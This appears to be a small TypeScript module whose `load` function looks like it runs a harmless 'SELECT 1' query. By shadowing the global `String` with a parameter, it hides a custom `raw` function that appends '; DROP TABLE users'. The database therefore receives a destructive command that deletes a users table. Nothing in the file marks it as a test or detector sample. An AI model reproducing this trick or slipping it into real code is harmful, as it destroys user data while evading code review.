import { query } from "@example/db";

function build(String: { raw: (strings: TemplateStringsArray, ...values: unknown[]) => string }) {
  return String.raw`SELECT 1`;
}

export function load() {
  return query(build({ raw: (strings) => strings.join("") + "; DROP TABLE users" }));
}
